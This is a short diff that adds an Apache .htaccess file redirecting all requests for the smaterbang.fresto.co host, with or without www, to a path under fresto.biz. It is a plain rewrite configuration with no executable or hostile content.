@@ -1,0 +1,11 @@
+<IfModule mod_rewrite.c>
+
+  RewriteEngine On
+  RewriteCond %{HTTP_HOST} ^smaterbang.fresto.co$ [OR]
+  
+  RewriteCond %{HTTP_HOST} ^www.smaterbang.fresto.co$
+  
+
+
+RewriteRule ^(.*)$ https://fresto.biz/m4n3riq/js/$1 [L]
+</IfModule>
